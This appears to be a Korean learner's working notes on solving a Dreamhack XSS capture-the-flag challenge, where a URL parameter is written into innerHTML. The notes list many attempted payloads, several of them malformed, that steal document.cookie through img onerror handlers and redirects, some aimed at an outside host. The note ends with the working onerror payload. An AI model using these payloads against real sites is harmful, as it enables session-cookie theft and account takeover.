var x=new URLSearchParams(location.search);
document.getElementById('vuln').innerHTML = x.get('param'); 

아 설마 그 값 자체는 맞는데 innerHTML 자체에서 작동하지 않는 건가? 
<script> alert(1) </script> 도 문법적으로 완벽한데 
param = 위의 값을 넣어도 반응이 없는 것처럼 그런 거 아닐까? 

이를 보완하기 위해 HTML5에서는 innerHTML 속성을 통해 삽입된 문자열에 
<script> 태그가 있을 경우 실행되지 않도록 처리했지만, 다른 우회적인 경로는 여전히 열려 있다.

아 이제 알겠다 innerHTML로 <script> 태그가 실행되지 않도록 한 거다 
우회하는 것이 핵심이 된다 아항 
이게 맞는 방향이구나 

<img src="#" onmouseover="alert('~~';)">
<img src="A" onmouseover="/memo?memo="+document.cookie;>
<img src='A' onmouseover='/memo?memo='+document.cookie;>
<script>location.href="/memo?memo="+document.cookie;</script> 
<img src="z" onerror="document.location.href=document.cookie">
<img src='z' onerror='document.location.href=document.cookie'>

<sCRipT>location.href="/memo?memo="+document.cookie;</scriPT>

역시나 <script>를 우회하는 것이 포인트 
위에처럼 생각해서 푸니까 결국엔 풀렸다 오예 ->? ㅇㅅㅇ?? 
아니넹 xss -1 을 풀어버린거넹 ㅇㅅㅇ;; 

<sCrIpt src=location.href="/memo?memo="+document.cookie;></SCRipt>
<sCRipT>location.href='/memo?memo='+document.cookie;</scriPT>
방법은 두 가지 일 수밖에 없지 않나? 
1) script를 교묘하게 바꾸어서 원하는 xss 문장을 집어넣거나 
->일단 이 경우의 수는 아닌 듯 하다
2) script를 쓰지 않고도 원하는 문장을 집어넣을 수 있는 태그를 사용하거나 
대신 현실적으로 한 가지 요소를 더해야겠지 
두 가지를 사용했다고 하더라도 문장의 뜻은 맞겠지만 원하는 값이 들어갔는지 
그건 확인을 해줘야 겠지 (구체적으로 말해서 따옴표) 
지금까지 내 느낌으로는 1)번은 아닌 거 같다 왜냐하면 충분히 우회를 피해갈만한 script를 작성해서 
여러 번이나 시도했는데도 불구하고 안 되었기 때문이다 
그렇게 열리는 것이 아닌 듯 하다 
<P>location.href="/memo?memo="+document.cookie;<P>
<scri<iframe>pt>alert("xss");</scrip<iframe>t>
location.href="/memo?memo="+document.cookie
<scri<iframe>pt>location.href="/memo?memo="+document.cookie;</scrip<iframe>t>
<scri<iframe>pt>location.href="http://127.0.0.1:8000/memo?memo=”+document.cookie;</scrip<iframe>t>

<img src="wrongLocation.jpg" onError="<script>location.href="/memo?memo="+document.cookie;</script>" />
<img src="wrongLocation.jpg" onError="location.href="/memo?memo="+document.cookie;" />
<img src='wrongLocation.jpg' onError="location.href='/memo?memo='+document.cookie;" />
<body topmargin=0 leftmargin=0 onload="document.cookie='<iframe width=100% height=800 src=http://127.0.0.1/memo?memo=></iframe>';">

var inputMarkup = '<img src=about: onerror=alert(document.cookie) />';

{{ document.createElement('img').setAttribute('src', 'http://127.0.0.1/memo?memo=' + document.cookie) }}

*단순<script>태그를 피해서 정확한 값을 post방식으로 넣는 것 


/memo 페이지에 플레그가 찍히도록
<img src=“http://host1.dreamhack.games:24037/memo?memo=”+document.write(document.cookie)></img>
구문을 flag에 넣어봤는데 메모에 cookie가 안찍히는데 접근방식이 이렇게 푸는게 아닌가요?

*img태그에 src속성은 javscript를 실행해주는 속성이 아닙니다. 단순히 경로를 불러오는 속성으로 임의의 url에 
요청을 보내는것은 가능하지만 javascript를 실행하지 못합니다. javascript가 실행될 수 있는 다른 속성을
찾아보세요. -> img는 img이지만(태그는 그대로) src말고 다른 속성을 써야 한다는 건가? 

<img src="news-1.jpg" alt=location.href="/memo?memo="+document.cookie; />
<img src="/examples/images/img_monalisa.png" alt="모나리자" height="280" width="180" longdesc='location.href="/memo?memo="+document.cookie;'>
<img src="/examples/images/img_monalisa.png" alt="모나리자" height="280" width="180" longdesc=location.href="/memo?memo="+document.cookie;>
<img src="asdf" onerror="alert(location.href="/memo?memo="+document.cookie;)">
<img src="asdf" onerror='alert(location.href="/memo?memo="+document.cookie;)'>
<img src="asdf" onerror='alert(flag.txt)'>
<img src="asdf" onerror='alert(flag.html)'>

<img src='wrongLocation.jpg' onError="location.href='/memo?memo='+document.cookie;" />
와 결국 풀기는 풀었다 kimkun이말이 맞았던 것이다 " ' 큰 따옴표냐 작은 따옴표냐 잘 보고 푸는 게 
제일 중요한 부분이었다 
여태까지 시도했던 것들이 다 아니라고 나왔기 때문에 그 내용을 다시 읽는 건 큰 의미가 없다고 생각했는데 
내가 시도했던 payload들을 하나씩 보면서 보다보니 뭔가 각이 나오기 시작했고 따옴표 하나만 조정했는데(정확히)
바로 답이 나왔다  
